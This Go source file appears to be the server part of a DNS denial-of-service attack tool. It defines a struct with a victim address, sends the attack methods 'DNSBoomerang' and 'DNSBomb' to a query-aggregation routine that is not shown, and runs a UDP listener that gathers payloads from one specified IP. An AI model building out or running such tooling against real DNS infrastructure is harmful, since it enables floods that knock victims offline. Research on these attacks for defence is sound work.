package server

import (
    "fmt"
    "net"
)

type Server struct {
    Method string // Attack method
    SrcIP  string // Source address
    DstIP  string // Victim address
}

type serverMethod func(s *Server) ()

var serverMethods = map[string]serverMethod{
    "DNSBoomerang": (*Server).queryAggregation,
    "DNSBomb":      (*Server).queryAggregation,
}

func (s *Server) Start() {
    // Get the attack function based on the attack method
    method, exists := serverMethods[s.Method]
    if !exists {
        fmt.Printf("Unsupported attack method: %v\n", s.Method)
        return
    }
    method(s)
}

// ListenUDP listens on the specified IP and port and sends the received application-layer payload to the channel
func ListenUDP(ip string, port int, messageChan chan<- Message) {
    addr := net.UDPAddr{
        Port: port,
        IP:   net.ParseIP("0.0.0.0"),
    }

    conn, err := net.ListenUDP("udp", &addr)
    if err != nil {
        fmt.Printf("Failed to start UDP listener: %v\n", err)
        close(messageChan)
        return
    }
    defer conn.Close()
    fmt.Printf("UDP listener started, port: %d\n", port)

    buffer := make([]byte, 4096)
    for {
        n, clientAddr, err := conn.ReadFromUDP(buffer)
        if err != nil {
            fmt.Printf("Error receiving UDP packet: %v\n", err)
            continue
        }

        // Check if the client IP matches the specified IP
        if clientAddr.IP.String() != ip {
            fmt.Printf("UDP packet from non-specified IP address (%s) discarded\n", clientAddr.IP.String())
            continue
        }

        // Encapsulate data
        message := Message{
            Payload: append([]byte(nil), buffer[:n]...), // Copy data
            SrcPort: clientAddr.Port,
        }

        messageChan <- message // Send the encapsulated data
    }
}
